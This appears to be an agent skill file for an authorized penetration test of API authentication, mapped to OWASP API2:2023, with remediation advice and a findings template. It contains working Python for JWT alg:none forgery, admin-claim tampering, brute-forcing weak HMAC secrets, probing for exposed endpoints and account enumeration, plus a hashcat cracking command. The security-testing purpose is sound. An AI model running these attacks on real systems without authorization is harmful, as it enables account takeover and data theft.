---
name: testing-api-authentication-weaknesses
description: Tests API authentication for bypass vulnerabilities — missing auth on endpoints, JWT weaknesses, OAuth flaws, credential stuffing susceptibility, token leakage, and session management gaps. Maps to OWASP API2:2023.
domain: cybersecurity
subdomain: api-security
tags:
- api-security
- owasp
- authentication
- jwt
- session-management
version: 1.0.0
---
# Testing API Authentication Weaknesses

## When to Use

- Assessing REST API authentication for bypass vulnerabilities before production deployment
- Testing JWT implementation for algorithm confusion, missing expiration, or weak secrets
- Checking whether all API endpoints consistently enforce authentication
- Evaluating token lifecycle — expiration, revocation, and refresh token rotation
- Validating API key generation entropy and revocation speed

**Do not use** without written authorization.

## Prerequisites

- Authorization specifying target API and in-scope auth mechanisms
- Test credentials for at least two roles (regular user, admin)
- Burp Suite Professional with JWT Editor extension
- Python 3.10+ with `requests` and `PyJWT`
- SecLists credential wordlists for brute-force tests
- API documentation or OpenAPI spec

## Workflow

### Step 1: Identify Authentication Mechanisms

```python
import requests, json, base64

BASE_URL = "https://target-api.example.com/api/v1"

# 1. Probe unauthenticated access
resp = requests.get(f"{BASE_URL}/users/me")
print(f"Unauthenticated /users/me: {resp.status_code}")
if resp.status_code == 200:
    print("[CRITICAL] Endpoint accessible without authentication")

# 2. Check WWW-Authenticate header
auth_header = resp.headers.get("WWW-Authenticate", "")
print(f"Auth scheme advertised: {auth_header or 'none'}")

# 3. Login and inspect token format
login = requests.post(f"{BASE_URL}/auth/login",
    json={"email": "testuser@example.com", "password": "TestPass123!"})
if login.status_code == 200:
    data = login.json()
    for key in ["token", "access_token", "jwt", "id_token"]:
        if key in data and data[key].count('.') == 2:
            print(f"JWT found in field: {key}")
    for key in ["refresh_token", "refresh"]:
        if key in data:
            print(f"Refresh token found in field: {key}")
    for cookie in login.cookies:
        print(f"Cookie set: {cookie.name} (httpOnly={cookie.has_nonstandard_attr('HttpOnly')})")
```

### Step 2: Unauthenticated Endpoint Scan

```python
probe_paths = [
    ("GET",  "/users"), ("GET", "/users/me"), ("GET", "/users/1"),
    ("GET",  "/admin/users"), ("GET", "/admin/settings"),
    ("GET",  "/health"), ("GET", "/metrics"), ("GET", "/debug"),
    ("GET",  "/actuator/env"), ("GET", "/swagger.json"),
    ("POST", "/graphql"), ("GET", "/config"), ("GET", "/.env"),
]

for method, path in probe_paths:
    try:
        r = requests.request(method, f"{BASE_URL}{path}", timeout=5)
        if r.status_code not in (401, 403):
            print(f"  [OPEN] {method} {path} -> {r.status_code}: {r.text[:80]}")
    except Exception:
        pass
```

### Step 3: JWT Analysis

```python
import hmac, hashlib, time

def decode_jwt(token):
    pad = lambda s: s + '=' * (4 - len(s) % 4)
    header  = json.loads(base64.urlsafe_b64decode(pad(token.split('.')[0])))
    payload = json.loads(base64.urlsafe_b64decode(pad(token.split('.')[1])))
    return header, payload

token = login.json().get("access_token", "")
header, payload = decode_jwt(token)
print(json.dumps(header, indent=2))
print(json.dumps(payload, indent=2))

issues = []

# Algorithm
if header.get("alg") == "none":
    issues.append("CRITICAL: alg=none — signatures not verified")
if header.get("alg") in ("HS256","HS384","HS512"):
    issues.append("INFO: Symmetric HMAC — check for weak/default secret")

# Expiration
if "exp" not in payload:
    issues.append("HIGH: No exp claim — token never expires")
elif payload["exp"] - time.time() > 86400:
    issues.append(f"MEDIUM: Token TTL {(payload['exp']-time.time())/3600:.0f}h — excessive")

# Sensitive data in payload
for field in ["password","ssn","credit_card","private_key","secret"]:
    if field in payload:
        issues.append(f"HIGH: Sensitive field '{field}' in JWT payload (not encrypted)")

# Missing standard claims
for claim in ["iss","aud","iat"]:
    if claim not in payload:
        issues.append(f"LOW: Missing standard claim: {claim}")

for i in issues:
    print(f"  [{i.split(':')[0]}] {i}")
```

### Step 4: JWT Attack Tests

```python
# Attack 1 — alg:none (remove signature entirely)
def forge_none(token):
    parts = token.split('.')
    hdr = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
    hdr['alg'] = 'none'
    new_hdr = base64.urlsafe_b64encode(json.dumps(hdr).encode()).decode().rstrip('=')
    return f"{new_hdr}.{parts[1]}."   # empty signature

# Attack 2 — modify payload claims without re-signing
def tamper_payload(token, overrides):
    parts = token.split('.')
    pl = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    pl.update(overrides)
    new_pl = base64.urlsafe_b64encode(json.dumps(pl).encode()).decode().rstrip('=')
    return f"{parts[0]}.{new_pl}.{parts[2]}"

# Attack 3 — brute-force HMAC secret
WEAK_SECRETS = [
    "secret","password","123456","jwt_secret","changeme",
    "supersecret","key","test","admin","default",
    "your-256-bit-secret","my-secret-key","s3cr3t",
]

def brute_hmac_secret(token):
    parts = token.split('.')
    hdr = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
    alg = hdr.get('alg','')
    if alg not in ('HS256','HS384','HS512'):
        return None
    hfunc = {'HS256': hashlib.sha256, 'HS384': hashlib.sha384, 'HS512': hashlib.sha512}[alg]
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    for secret in WEAK_SECRETS:
        sig = base64.urlsafe_b64encode(
            hmac.new(secret.encode(), signing_input, hfunc).digest()
        ).decode().rstrip('=')
        if sig == parts[2]:
            print(f"[CRITICAL] JWT secret found: '{secret}'")
            return secret
    print("No weak secret matched — run hashcat -m 16500 for extended brute force")
    return None

# Run attacks
for variant in [forge_none(token)]:
    r = requests.get(f"{BASE_URL}/users/me", headers={"Authorization": f"Bearer {variant}"})
    if r.status_code == 200:
        print("[CRITICAL] alg:none bypass accepted")

admin_token = tamper_payload(token, {"role": "admin", "is_admin": True})
r = requests.get(f"{BASE_URL}/admin/users", headers={"Authorization": f"Bearer {admin_token}"})
if r.status_code == 200:
    print("[CRITICAL] Payload tampered without signature validation")

brute_hmac_secret(token)
```

### Step 5: Token Lifecycle

```python
# Revocation — token should fail after logout
requests.post(f"{BASE_URL}/auth/logout", headers={"Authorization": f"Bearer {token}"})
r = requests.get(f"{BASE_URL}/users/me", headers={"Authorization": f"Bearer {token}"})
if r.status_code == 200:
    print("[HIGH] Token still valid after logout — no server-side revocation")

# Refresh token rotation — re-using the same refresh token should fail
refresh_token = login.json().get("refresh_token")
if refresh_token:
    r1 = requests.post(f"{BASE_URL}/auth/refresh", json={"refresh_token": refresh_token})
    r2 = requests.post(f"{BASE_URL}/auth/refresh", json={"refresh_token": refresh_token})
    if r2.status_code == 200:
        print("[HIGH] Refresh token reuse allowed — rotation not implemented")

# Token in URL — risks appearing in access logs and Referer headers
r = requests.get(f"{BASE_URL}/users/me?token={token}")
if r.status_code == 200:
    print("[MEDIUM] Token accepted in query parameter — may leak via logs/referrer")
```

### Step 6: Password Policy and Account Enumeration

```python
# Weak password acceptance
for pwd in ["a", "password", "12345678", "Password1", "", " "]:
    r = requests.post(f"{BASE_URL}/auth/register",
        json={"email": f"test{hash(pwd)%9999}@example.com", "password": pwd, "name": "Test"})
    if r.status_code in (200, 201):
        print(f"[WEAK POLICY] Accepted password: '{pwd}'")

# Account enumeration via response differences
r_valid   = requests.post(f"{BASE_URL}/auth/login",
    json={"username": "realuser@example.com", "password": "wrongpass"})
r_invalid = requests.post(f"{BASE_URL}/auth/login",
    json={"username": "noexist_xyz@example.com", "password": "wrongpass"})

if r_valid.text != r_invalid.text or r_valid.status_code != r_invalid.status_code:
    print(f"[MEDIUM] Account enumeration possible:")
    print(f"  Valid user:   {r_valid.status_code}   {r_valid.text[:80]}")
    print(f"  Invalid user: {r_invalid.status_code}  {r_invalid.text[:80]}")
```

## Key Concepts

| Term | Definition |
|------|------------|
| **Broken Authentication** | OWASP API2:2023 — weaknesses allowing attackers to assume other users' identities |
| **JWT alg:none** | Algorithm confusion attack removing the signature requirement entirely |
| **Token Revocation** | Server-side invalidation of tokens before expiry — critical for logout and password-change flows |
| **Refresh Token Rotation** | Issuing a new refresh token on every use, preventing replay of stolen tokens |
| **Account Enumeration** | Inferring valid usernames from differing error messages or response times |
| **Credential Stuffing** | Automated replay of leaked credential pairs against authentication endpoints |

## Tools

- **Burp Suite JWT Editor** — decode, edit, and re-sign tokens with attack modes
- **jwt_tool** — 12+ JWT attack modes including alg:none, key confusion, JWKS spoofing
- **hashcat** — GPU brute-force of JWT HMAC secrets (mode 16500)
- **Hydra** — network login brute-forcer for HTTP-based auth

## Output Format

```
## Finding: JWT HMAC Secret Brute-Forceable; No Token Revocation

**ID**: API-AUTH-001  |  Severity: Critical (CVSS 9.1)
**OWASP API**: API2:2023 — Broken Authentication

**Description**: The API signs JWTs with a guessable HMAC secret. Any captured
token can be used to forge admin-scoped tokens. Separately, tokens remain valid
indefinitely after logout because no server-side revocation exists.

**Attack Chain**:
1. Capture a valid JWT from any authenticated session
2. hashcat -a 0 -m 16500 jwt.txt wordlist.txt  →  secret: "company-secret-2024"
3. Forge token with "role":"admin" using recovered secret
4. GET /api/v1/admin/users  →  200 OK, all 50,000 user accounts returned

**Remediation**:
1. Replace HS256 with RS256 (2048-bit RSA key pair)
2. If HMAC required: use cryptographically random secret ≥ 256 bits
3. Implement Redis-backed token blacklist; invalidate on logout and password change
4. Reduce access token TTL to 15 min; enforce refresh token rotation
```
